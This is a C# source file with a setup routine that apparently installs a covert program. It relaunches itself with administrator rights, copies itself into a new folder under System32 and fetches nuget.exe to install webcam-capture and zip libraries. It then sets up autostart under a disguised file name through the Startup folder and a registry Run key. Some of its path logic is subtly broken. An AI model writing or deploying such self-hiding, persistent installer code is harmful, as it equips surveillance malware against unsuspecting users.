using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Principal;

namespace ConsoleApp8
{
    static class Setup
    {
        private static string _nugetPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "nuget.exe");
        private static string _nugetUrl = "https://dist.nuget.org/win-x86-commandline/v6.5.1/nuget.exe";
        private static string _packagesPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "packages");
        private static string[] _packageNames = { "AForge.Video", "AForge.Video.DirectShow", "AForge","DotNetZip" };
        private static string _dllsDirectory = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "dlls");

        private static string _restartFlagFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "restart.flag");
        static string targetDirectory = FindFarthestSystemFolder();
        public static void Run()
        {

            if (!IsRunAsAdministrator())
            {
                RequestAdminRights();
                return;
            }

            string appFileName = MoveAppTo(targetDirectory);
            string restartFlagFilePath = Path.Combine(targetDirectory, "restart.flag");

            if (!File.Exists(restartFlagFilePath))
            {
                Console.WriteLine("Creating restart flag in target directory...");
                File.Create(restartFlagFilePath).Dispose();
            }
            if (File.Exists(_restartFlagFile))
            {
                Console.WriteLine("The application has already been restarted once. Skipping restart.");
                if (!File.Exists(_dllsDirectory) && !File.Exists(_nugetPath))
                {
                    DownloadNuGet();

                    InstallPackages();

                    ExtractDlls();
                }
                else
                {
                    return;
                }
            }
            RestartApp(targetDirectory, appFileName);
            SetAutostart(appFileName);
        }


        private static void DownloadNuGet()
        {
            if (!File.Exists(_nugetPath))
            {
                Console.WriteLine("Downloading nuget.exe...");
                using (WebClient client = new WebClient())
                {
                    client.DownloadFile(_nugetUrl, _nugetPath);
                }
                Console.WriteLine("NuGet downloaded.");
            }
        }

        private static void InstallPackages()
        {
            if (!Directory.Exists(_packagesPath))
            {
                Directory.CreateDirectory(_packagesPath);
            }

            foreach (var packageName in _packageNames)
            {
                InstallPackage(packageName);
            }
        }


        private static bool IsRunAsAdministrator()
        {
            // Проверяем, если процесс запущен с правами администратора
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static void RequestAdminRights()
        {
            // Запрашиваем права администратора
            ProcessStartInfo processStartInfo = new ProcessStartInfo
            {
                FileName = Environment.GetCommandLineArgs()[0],
                Verb = "runas",
                UseShellExecute = true
            };
            Process.Start(processStartInfo);
            Environment.Exit(0);
        }



        private static void InstallPackage(string packageName)
        {
            string packageDirectory = Path.Combine(_packagesPath, packageName);

            // Если папка с пакетами уже существует, значит, пакеты уже были установлены
            if (Directory.Exists(packageDirectory))
            {
                Console.WriteLine($"Package {packageName} is already installed. Skipping.");
                return;
            }
      
            ProcessStartInfo processStartInfo = new ProcessStartInfo
            {
                FileName = _nugetPath,
                Arguments = $"install {packageName} -OutputDirectory \"{_packagesPath}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(processStartInfo))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                Console.WriteLine("Output: " + output);
                Console.WriteLine("Error: " + error);

                process.WaitForExit();
            }
        }

        private static void ExtractDlls()
        {
            string parentDirectory = Path.GetDirectoryName(_dllsDirectory);

            if (Directory.Exists(parentDirectory))
            {
                Console.WriteLine($"DLLs will be extracted to the parent directory of {_dllsDirectory}");
            }
            else
            {
                Console.WriteLine("Parent directory does not exist. Creating it.");
                Directory.CreateDirectory(parentDirectory);
            }

            if (Directory.Exists(_dllsDirectory))
            {
                Console.WriteLine("DLLs are already extracted.");
                return;
            }

            // Если папка с DLL ещё не существует, создаём её
            Directory.CreateDirectory(_dllsDirectory);

            var dllFiles = Directory.GetFiles(_packagesPath, "*.dll", SearchOption.AllDirectories);

            foreach (var dllFile in dllFiles)
            {
                string fileName = Path.GetFileName(dllFile);
                string destPath = Path.Combine(parentDirectory, fileName);  // Extract DLLs to the parent folder

                if (!File.Exists(destPath))
                {
                    Console.WriteLine($"Copying {fileName} to {parentDirectory}...");
                    File.Copy(dllFile, destPath);
                }
            }
        }


        private static string FindFarthestSystemFolder()
        {
            // Пример нахождения системной папки, например, C:\Windows\System32
            string systemFolder = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string farthestFolder = Path.Combine(systemFolder, "Custom");

            if (!Directory.Exists(farthestFolder))
            {
                Directory.CreateDirectory(farthestFolder);
            }

            return farthestFolder;
        }

        private static void MoveDllsTo(string targetDirectory)
        {
            var dllFiles = Directory.GetFiles(_dllsDirectory, "*.dll");

            foreach (var dllFile in dllFiles)
            {
                string destPath = Path.Combine(targetDirectory, Path.GetFileName(dllFile));

                if (!File.Exists(destPath))
                {
                    Console.WriteLine($"Moving {Path.GetFileName(dllFile)} to {targetDirectory}...");
                    File.Copy(dllFile, destPath);
                }
            }
        }
        private static string MoveAppTo(string targetDirectory)
        {
            // Получаем список .exe файлов в текущей директории
            var exeFiles = Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory, "*.exe");

            // Если найден хотя бы один .exe файл в текущей директории
            string selectedExe = exeFiles.Length > 0 ? exeFiles[0] : null;

            if (string.IsNullOrEmpty(selectedExe))
            {
                // Ищем системный .exe файл в директории C:\Windows\System32
                string system32Directory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "System32");
                exeFiles = Directory.GetFiles(system32Directory, "*.exe");

                if (exeFiles.Length > 0)
                {
                    selectedExe = exeFiles[0]; // Используем первый найденный .exe файл
                }
                else
                {
                    throw new Exception("No executable files found either in current directory or in system folder.");
                }
            }

            // Получаем имя файла без пути и расширения
            string exeFileName = Path.GetFileName(selectedExe);

            // Формируем целевой путь для копирования файла
            string targetAppPath = Path.Combine(targetDirectory, exeFileName);

            // Перемещаем выбранный .exe файл в эту папку с тем же именем
            if (!File.Exists(targetAppPath))
            {
                Console.WriteLine($"Moving app to {targetDirectory} as {exeFileName}...");
                File.Copy(selectedExe, targetAppPath);
            }

            // Создаем флаг перезапуска в целевой директории, если его нет

            return targetAppPath;
        }






        private static void RestartApp(string targetDirectory, string appFileName)
        {
            string appFile = Path.Combine(targetDirectory, Path.GetFileName(appFileName));

            Process.Start(appFile);
            Environment.Exit(0);
        }

        private static void DeleteNuGet()
        {
            if (File.Exists(_nugetPath))
            {
                Console.WriteLine("Deleting nuget.exe...");
                File.Delete(_nugetPath);
                Console.WriteLine("NuGet deleted.");
            }
        }

        private static void SetAutostart(string appFileName)
        {
            string autostartFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "MyApp");

            // Создаем директорию автозапуска, если она не существует
            if (!Directory.Exists(autostartFolder))
            {
                Directory.CreateDirectory(autostartFolder);
            }

            // Получаем новое имя для .exe файла (переименовываем)
            string renamedExeFileName = "MyRenamedApp.exe";  // Новое имя для exe файла

            // Формируем путь для копирования программы в папку автозапуска
            string autostartAppPath = Path.Combine(autostartFolder, renamedExeFileName);

            // Проверяем, существует ли файл с таким именем, и если нет, копируем
            if (!File.Exists(autostartAppPath))
            {
                Console.WriteLine("Copying app to Startup folder...");
                File.Copy(appFileName, autostartAppPath);
            }

            // Создаем запись в реестре для автозапуска
            string appName = Path.GetFileNameWithoutExtension(renamedExeFileName); // Получаем имя без расширения
            string registryKey = @"Software\Microsoft\Windows\CurrentVersion\Run";

            // Устанавливаем путь к новому .exe файлу с переименованным именем
            Microsoft.Win32.Registry.SetValue(
                "HKEY_CURRENT_USER\\" + registryKey,
                appName,
                autostartAppPath
            );
            Console.WriteLine("Autostart entry created with new file name.");
        }


    }
}
